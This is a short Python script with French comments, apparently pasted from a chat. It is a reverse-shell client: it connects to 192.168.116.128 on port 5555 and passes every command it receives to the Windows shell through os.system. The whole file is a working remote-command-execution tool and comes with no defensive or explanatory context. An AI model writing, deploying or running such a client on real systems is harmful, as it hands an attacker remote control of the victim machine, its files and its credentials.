Hicham BOUBTITA17:07import os
#Socket client
import socket

host, port_ecoute = ('192.168.116.128', 5555)

mon_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mon_socket.connect((host, port_ecoute))
print("connexion réussie sur :", host, ":", port_ecoute)

while True:
    # data = "En attente de vos commandes"
    # data = data.encode("utf8")
    # mon_socket.sendall(data)
     data2 = mon_socket.recv(1024)
     print("commande recu : ", data2.decode())
     print("exécution de la commande")
     print("commande éxécuter")
     os.system('cmd /c' + data2.decode())